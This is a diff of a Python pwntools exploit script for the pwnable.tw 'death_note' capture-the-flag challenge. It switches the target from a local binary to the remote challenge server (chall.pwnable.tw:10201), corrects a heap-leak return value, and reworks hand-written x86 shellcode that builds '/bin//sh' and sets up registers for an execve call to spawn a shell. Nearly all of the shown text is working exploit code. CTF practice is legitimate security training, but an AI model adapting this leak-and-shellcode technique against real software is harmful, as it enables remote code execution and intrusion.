@@ -45,7 +45,7 @@ def leak_heap():
 
     print('heap_base: {:#x}'.format(heap_base))
 
-    return addr
+    return heap_base
 
 
 def send_code(idx, chunk, delim='\x00'):
@@ -116,7 +116,8 @@ note_addr = 0x804A060
 
 if __name__ == '__main__':
     while True:
-        p = process('/home/len/pwnable/death_note')
+        # p = process('/home/len/pwnable/death_note')
+        p = remote('chall.pwnable.tw',10201)
         stdout_addr = leak_libc()
         libc_base = stdout_addr - stdout_offset
         print('libc_base: {:#x}'.format(libc_base))
@@ -140,16 +141,15 @@ if __name__ == '__main__':
         pop eax
         xor eax, 0x20202020
         push eax
+        push eax
+        pop ecx
+        pop edx
+        push eax
         push   0x68732f2f
         push   0x6e69622f
         push esp
         pop ebx
-        
-        push   eax
-        push   ebx
-        
-        push esp 
-        pop ecx
+    
         '''
 
         libc_base = 0x8413000
@@ -171,7 +171,8 @@ if __name__ == '__main__':
         pop esi
         ''' % (int80_1_res, int80_1_pad)
 
-        target = heap_base + 54 + 11
+        target = heap_base + 8 + 65
+        print('heap_base: {:#x},target: {:#x}'.format(heap_base, target))
 
         target_res, target_pad = bypass(target)
 
